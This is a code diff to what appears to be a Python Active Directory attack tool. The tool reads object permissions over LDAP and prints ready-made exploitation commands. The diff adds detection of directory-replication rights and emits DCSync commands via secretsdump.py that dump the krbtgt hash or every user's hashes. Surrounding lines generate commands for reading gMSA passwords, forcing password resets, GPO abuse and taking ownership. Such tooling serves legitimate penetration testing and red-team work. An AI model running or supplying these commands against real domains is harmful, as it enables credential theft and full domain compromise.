@@ -161,6 +161,11 @@ def get_exploitation_hint(right, target, obj_type, domain, dc_ip, current_user, 
     elif "ReadGmsaPassword" in right:
         #hints.append(("Read GMSA Password (Option A)", f"bloodyAD --host {dc_fqdn} -d {domain} -u {current_user} -p {current_auth} get gmsaPassword {target}"))
         hints.append(("Read GMSA Password (Option B)", f"nxc ldap {dc_fqdn} -u {current_user} -p {current_auth} --gmsa"))
+    elif right == "DS-Replication-Get-Changes" or right == "DS-Replication-Get-Changes-All":
+        target_string = f"'{domain}/{current_user}@{dc_ip}'" if is_hash else f"'{domain}/{current_user}:{current_auth}@{dc_ip}'"
+        hash_arg = f" -hashes :{current_auth}" if is_hash else ""
+        hints.append(("DCSync (KRBTGT)", f"secretsdump.py {target_string}{hash_arg} -just-dc-user krbtgt"))
+        hints.append(("DCSync (All Users)", f"secretsdump.py {target_string}{hash_arg} -just-dc"))
     elif "Extended Rights" in right:
         if obj_type == "user":
             hints.append(("Force Change Password (All Extended Rights)", f"bloodyAD --host {dc_fqdn} -d {domain} -u {current_user} -p {bloody_auth} set password {target} NewPassword123!"))
@@ -206,6 +211,8 @@ def get_exploitation_hint(right, target, obj_type, domain, dc_ip, current_user, 
             hints.append(("GPO Abuse (Step 3)", f"python3 pyGPOAbuse.py '{domain}/{current_user}:{bloody_auth}' -gpo-id '{gpo_id}' -f -dc-ip {dc_ip}"))
         else:
             hints.append(("Take Ownership", f"owneredit.py -action write -new-owner {current_user} -target {target} '{domain}/{current_user}:{current_auth}'"))
+
+    return hints
 
 def main(args=None):
     if args is None:
@@ -303,11 +310,11 @@ def main(args=None):
         all_victim_sids[sid] = f"{name} (group)"
     #user_filter = '(&(objectClass=person)(objectClass=user))'
     controls = [('1.2.840.113556.1.4.801', True, b'\x30\x03\x02\x01\x07')]
-    principal_filter = '(|(objectClass=user)(objectClass=group)(objectClass=computer)(objectClass=msDS-GroupManagedServiceAccount)(objectClass=organizationalUnit)(objectClass=groupPolicyContainer))'
+    principal_filter = '(|(objectClass=user)(objectClass=group)(objectClass=computer)(objectClass=msDS-GroupManagedServiceAccount)(objectClass=organizationalUnit)(objectClass=groupPolicyContainer)(objectClass=domain))'
     #principal_filter = '(|(objectClass=user)(objectClass=group)(objectClass=computer)(objectClass=msDS-GroupManagedServiceAccount))'
     #principal_filter = '(|(objectClass=user)(objectClass=group)(objectClass=computer))'
     #principal_filter = '(|(objectClass=user)(objectClass=group)(objectClass=computer)(objectClass=msDS-GroupManagedServiceAccount))'
-    conn.search(base_dn, principal_filter, attributes=['sAMAccountName', 'nTSecurityDescriptor', 'objectClass', 'dNSHostName', 'msDS-GroupMSAMembership', 'displayName', 'gPCFileSysPath', 'distinguishedName'], controls=controls)
+    conn.search(base_dn, principal_filter, attributes=['sAMAccountName', 'nTSecurityDescriptor', 'objectClass', 'dNSHostName', 'msDS-GroupMSAMembership', 'displayName', 'gPCFileSysPath', 'distinguishedName', 'name'], controls=controls)
     #if not conn.entries:
         #print(f"[-] Could not find: {target_user}")
         #exit()
@@ -321,9 +328,11 @@ def main(args=None):
     found = False # never delete this!!!!!!!!!!!!!!!!
 
     for entry in conn.entries:
-        target_name = str(entry.sAMAccountName) if hasattr(entry, 'sAMAccountName') and str(entry.sAMAccountName) else None
-        if not target_name and hasattr(entry, 'displayName') and str(entry.displayName):
+        target_name = str(entry.sAMAccountName) if hasattr(entry, 'sAMAccountName') and entry.sAMAccountName else None
+        if not target_name and hasattr(entry, 'displayName') and entry.displayName:
             target_name = str(entry.displayName)
+        if not target_name and hasattr(entry, 'name') and entry.name:
+            target_name = str(entry.name)
         if not target_name:
             continue
         if target_name.lower() == args.username.lower():
@@ -343,6 +352,8 @@ def main(args=None):
             obj_type = "ou"
         elif "groupPolicyContainer" in obj_classes:
             obj_type = "gpo"
+        elif "domain" in obj_classes or "domainDNS" in obj_classes:
+            obj_type = "domain"
         
         target_fqdn = str(entry.dNSHostName) if hasattr(entry, 'dNSHostName') else target_name
         if target_fqdn.endswith('$'):
@@ -445,6 +456,10 @@ def main(args=None):
                                         rights.append("User_Force_Change_Password")
                                     elif obj_guid == Self_Membership:
                                         rights.append("AddSelf (Self-Membership) - via SELF bit")
+                                    elif obj_guid == DS_Replication_Get_Changes:
+                                        rights.append("DS-Replication-Get-Changes")
+                                    elif obj_guid == DS_Replication_Get_Changes_All:
+                                        rights.append("DS-Replication-Get-Changes-All")
                                 except:
                                     pass
 
